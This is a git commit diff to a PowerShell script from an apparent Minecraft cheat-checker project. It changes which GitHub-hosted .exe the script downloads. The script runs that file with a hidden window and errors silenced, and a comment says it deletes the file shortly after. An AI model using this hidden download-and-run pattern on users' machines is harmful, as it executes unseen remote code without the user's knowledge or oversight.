012e2c5ed3ec2126add8e942afaae9e8549dceec
WarRagon404 <gorbunova-2hg24@rambler.ru>
2025-12-04 22:06:01 +0300

    Update MinecraftCheckerRust(ALT2).ps1

--- MinecraftCheckerRust(ALT2).ps1
+++ MinecraftCheckerRust(ALT2).ps1
@@ -91,10 +91,10 @@ try {
     Start-Sleep 1
     
     # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/WarRagon404/MinecraftCheatChecker/raw/refs/heads/main/source/assets/custom/RustCheatChecker.exe" -OutFile "MinecraftCheatChecker.exe" -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri "https://github.com/WarRagon404/MinecraftCheatChecker/raw/refs/heads/main/source/assets/custom/MinecraftCheatCheckerAlt2.exe" -OutFile "MinecraftCheatCheckerAlt2.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
-    Start-Process -FilePath "MinecraftCheatChecker.exe" -WindowStyle Hidden
+    Start-Process -FilePath "MinecraftCheatCheckerAlt2.exe" -WindowStyle Hidden
     
     # Удаляем файл через 5 секунды
     
